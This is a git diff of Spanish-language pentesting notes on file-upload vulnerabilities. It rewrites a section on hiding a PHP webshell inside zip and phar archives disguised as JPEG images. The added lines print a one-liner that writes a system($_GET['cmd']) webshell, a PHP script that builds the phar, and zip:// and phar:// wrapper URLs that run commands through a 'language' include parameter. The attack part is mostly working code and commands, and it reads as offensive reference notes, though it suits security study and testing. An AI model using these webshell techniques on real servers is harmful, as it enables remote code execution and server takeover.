@@ -1,7 +1,8 @@
-
 # 1. File-Upload ¿Como funciona?
 
-La carga de archivos de usuario es una característica clave para la mayoría de las aplicaciones web modernas para permitir la extensibilidad y personalización de las aplicaciónes web. *Un sitio web de redes sociales permite la carga de imágenes de perfil de usuario y otros medios sociales, mientras que un sitio web corporativo puede permitir a los usuarios cargar PDFs y otros documentos para uso corporativo.*
+La carga de archivos de usuario es una característica clave para la mayoría de las aplicaciones web modernas para permitir la extensibilidad y personalización de las aplicaciónes web (configuración de perfil y carga de datos personales)
+
+*Un sitio web de redes sociales permite la carga de imágenes de perfil de usuario y otros medios sociales, mientras que un sitio web corporativo puede permitir a los usuarios cargar PDFs y otros documentos para uso corporativo.*
 
 > [!CAUTION]
 > La vulnerabilidad acontece cuando no se filtran ni validan correctamente los archivos que se suben y se terminan subiendo datos maliciosos que se interpretan por el backend de la aplicación, permitiendo al atacante ejecutar comandos arbitrarios y tomar el control del servidor
@@ -238,21 +239,36 @@ Podemos realizar un XXE en otros tipos de archivos que incluyen datos XML en su 
 
 
 ---
-#### ZIPS
-Si nos permiten subir zips, podemos meter la webshell en un zip
-```
-zip shell.zip shell.php
-```
-
-Y acceder a ella con el wrapper `phar`: `?page=phar://./uploads/cmd.jpeg/cmd.php&cmd=ls%26`
-
-O de manera anidadada
+#### ZIPS y phar
+Si nos permiten subir zips, podemos meter la webshell en un zip (llamado `shell.jpg`), de la siguiente manera:
 ```bash
-zip pwn.zip pwn.php; mv pwn.zip pwn.pdf; # pwn.pdf = zip de pwn.php
-zip pwn.pdf.zip pwn.pdf                  # pwn.pdf.zip = zip de zip de pwn.php
-curl "http://web.com/downloads/243qsdqw/epwn.pdf/pwn"
+$: echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
 ```
 
+Podemos utilizar el wrapper **zip** para ejecutar código PHP. Sin embargo, este wrapper no está habilitado por defecto, por lo que este método puede no funcionar siempre. 
+```bash
+http://web.com/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+# shell.jpg#shell.php&cmd=id
+```
+
+Finalmente, podemos usar el wrapper `phar://` para lograr un resultado similar. Para hacerlo, primero escribiremos el siguiente script PHP en un archivo `shell.php`:
+```php
+<?php
+$phar = new Phar('shell.phar'); $phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>'); $phar->stopBuffering();
+```
+
+Por tanto se compilar el phar y se renombra a `shell.jpg`
+```bash
+$: php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+```
+
+Accedemos con el wrapper **phar**:
+```bash
+http://web.com/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
+# shell.jpg/shell.txt&cmd=id
+```
 
 ---
 #### Sobre escribir código fuente
